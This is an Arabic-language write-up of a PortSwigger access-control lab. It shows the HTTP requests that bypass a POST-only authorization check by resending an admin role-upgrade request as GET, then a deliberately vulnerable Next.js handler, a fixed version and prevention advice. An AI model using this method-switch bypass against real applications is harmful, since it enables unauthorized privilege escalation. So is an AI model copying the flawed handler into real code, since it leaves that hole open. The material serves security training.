# Lab: Method-based access control can be circumvented

> **Category:** Access Control  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - Method-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة التحكم في الوصول (Access Control) التي تعتمد جزئياً على **طريقة الطلب (HTTP Method)**. سنستخدم حساب `wiener:peter` ونتجاوز الحماية لترقية أنفسنا إلى مدير (administrator).

**المعطيات:**
- حساب المدير: `administrator:admin` (لمعرفة كيف تعمل الوظيفة)
- حسابنا: `wiener:peter`

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: تسجيل الدخول بحساب المدير (للفهم)

- سجل الدخول بـ `administrator:admin`
- اذهب إلى لوحة التحكم `/admin`
- لاحظ أن هناك وظيفة لترقية المستخدمين (مثل ترقية `carlos` إلى مدير)

### الخطوة 2: اعتراض طلب الترقية في Burp

- قم بترقية مستخدم (مثل `carlos`)
- اعترض الطلب في Burp:

```http
POST /admin-roles HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=ADMIN_SESSION_COOKIE
Content-Type: application/x-www-form-urlencoded

username=carlos&action=upgrade
```

- أرسل هذا الطلب إلى **Repeater**

### الخطوة 3: تسجيل الدخول بحساب wiener

- افتح نافذة خاصة (Incognito/Private)
- سجل الدخول بـ `wiener:peter`

### الخطوة 4: اختبار الطلب بحساب wiener

- في Repeater، استبدل كوكي الجلسة (session) بـ **كوكي wiener**
- أرسل الطلب:

```http
POST /admin-roles HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=WIENER_SESSION_COOKIE
Content-Type: application/x-www-form-urlencoded

username=carlos&action=upgrade
```

**النتيجة:** `401 Unauthorized` (ممنوع) ❌

### الخطوة 5: اختبار طريقة طلب غير صحيحة

- غيّر طريقة الطلب من `POST` إلى `POSTX` (أي شيء غير صحيح):

```http
POSTX /admin-roles HTTP/1.1
...
```

**النتيجة:** تتغير الرسالة إلى `Missing parameter` (وليس `Unauthorized`) ✅

هذا يعني أن الخادم يتحقق من الصلاحية فقط لطلبات `POST` العادية!

### الخطوة 6: تحويل الطلب إلى GET

- في Repeater، اضغط بزر الماوس الأيمن → **Change request method**
- الطلب يتحول إلى:

```http
GET /admin-roles?username=carlos&action=upgrade HTTP/1.1
Cookie: session=WIENER_SESSION_COOKIE
```

### الخطوة 7: تغيير username إلى wiener

- غيّر `username=carlos` إلى `username=wiener`:

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Cookie: session=WIENER_SESSION_COOKIE
```

### الخطوة 8: إرسال الطلب

- اضغط **Send**
- **النتيجة:** تم ترقية `wiener` إلى مدير ✅

### الخطوة 9: التحقق من الصلاحية

- في المتصفح (حساب wiener)، اذهب إلى `/admin`
- ستظهر لوحة التحكم ✅

### الخطوة 10: حل المختبر

بمجرد الوصول إلى لوحة التحكم (أو ترقية نفسك)، سيتم حل المختبر تلقائياً ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **أين الثغرة؟** | الخادم يتحقق من الصلاحية فقط لطلبات `POST`، ويتجاهل طلبات `GET` |
| **كيف نستغلها؟** | نحول الطلب من `POST` إلى `GET` |
| **لماذا نجح GET؟** | الخادم لا يطبق نفس قواعد access control على جميع الطرق |
| **ماذا تعلمنا من `POSTX`؟** | تغير رسالة الخطأ يؤكد أن التحقق يعتمد على وجود `POST` تحديداً |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

الخادم يطبق access control فقط على طريقة الطلب `POST`، وليس على جميع الطرق (`GET`, `PUT`, `DELETE`, إلخ).

---

### ❌ Non-Compliant Code (Next.js)

```javascript
// pages/api/admin-roles.js
export default function handler(req, res) {
  const { sessionId } = req.cookies;
  const currentUser = getUserBySession(sessionId);
  
  // خطأ: يتحقق من الصلاحية فقط لطلبات POST
  if (req.method === 'POST') {
    if (!currentUser || currentUser.role !== 'admin') {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const { username, action } = req.body;
    if (action === 'upgrade') {
      upgradeUser(username);
    }
  }
  
  // طلبات GET تمر بدون أي تحقق!
  if (req.method === 'GET') {
    const { username, action } = req.query;
    if (action === 'upgrade') {
      upgradeUser(username); // أي شخص يمكنه الترقية عبر GET!
    }
  }
  
  res.json({ success: true });
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
// pages/api/admin-roles.js
export default function handler(req, res) {
  const { sessionId } = req.cookies;
  const currentUser = getUserBySession(sessionId);
  
  // التصحيح: التحقق من الصلاحية لجميع الطرق
  const isAdmin = currentUser && currentUser.role === 'admin';
  
  if (!isAdmin) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  // فقط بعد التحقق من الصلاحية، نتعامل مع الطلب
  if (req.method === 'POST') {
    const { username, action } = req.body;
    if (action === 'upgrade') {
      upgradeUser(username);
    }
  } else if (req.method === 'GET') {
    // حتى مع GET، يجب أن يكون المستخدم مديراً
    const { username, action } = req.query;
    if (action === 'upgrade') {
      upgradeUser(username);
    }
  } else {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  res.json({ success: true });
}
```

**الخلاصة:** 
1. لا تعتمد على طريقة الطلب كآلية أمان
2. تحقق من الصلاحية في **بداية** كل هاندلر، قبل أي منطق
3. طبق نفس قواعد access control على جميع الطرق (GET, POST, PUT, DELETE)

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **التحقق من الصلاحية أولاً:** قبل أي منطق خاص بالطريقة.
2. **استخدم middleware موحد:** للتحقق من الصلاحية لجميع الطرق.
3. **لا تعتمد على طريقة الطلب للأمان:** GET و POST كلاهما يمكن استخدامهما في الهجمات.
4. **استخدم CSRF tokens:** حتى مع GET إذا كان endpoint يغير الحالة.

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented)
- [Access Control Cheat Sheet](https://portswigger.net/web-security/access-control)
- [HTTP Methods](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods)
